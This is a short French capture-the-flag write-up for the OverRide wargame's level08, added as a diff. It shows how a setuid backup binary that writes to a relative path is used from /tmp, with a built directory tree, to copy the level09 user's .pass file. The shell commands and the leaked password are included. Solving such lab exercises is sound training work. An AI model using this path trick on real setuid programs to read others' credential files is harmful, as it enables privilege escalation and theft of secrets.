@@ -1,0 +1,45 @@
+-----> Pas de buffer overflow ici. Va falloir user de ruse.
+-----> On analyse la source:
+- Ouverture de "./backups/.log"
+- Ouverture de argv[1].
+- Ouverture de strncat("./backups/" + argv[1]).
+
+-----> Si l'un des 3 fails c mort. Il va donc falloir bien setup notre exploit.
+
+level08@OverRide:~$ ls -la
+total 28
+dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
+dr-x--x--x  1 root    root      260 Oct  2  2016 ..
+drwxrwx---+ 1 level09 users     100 Jun 23 19:56 backups
+-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
+-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
+-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
+-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
+-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
+
+-----> On voit qu'on a pas les droit d'ecriture dans ~/level08.
+-----> On va donc dans /tmp.
+-----> On creer un dossier "backups" et un fichier "backups/.log"
+-----> On veut recuperer "/home/users/level09/.pass". Ca sera notre argv[1].
+-----> Le souci va etre la 3eme ouverture a savoir "./backups//home/users/level09/.pass", vu que home, users et level09 n'existe pas encore
+-----> On creer donc un dossier /backups/home.
+-----> On creer donc un dossier /backups/home/users.
+-----> On creer donc un dossier /backups/home/users/level09.
+-----> et normalement tout devrait marcher:
+
+level08@OverRide:~$ cd /tmp
+level08@OverRide:/tmp$ mkdir backups
+level08@OverRide:/tmp$ mkdir backups/home
+level08@OverRide:/tmp$ mkdir backups/home/users
+level08@OverRide:/tmp$ mkdir backups/home/users/level09
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+
+
+
+Bingo !
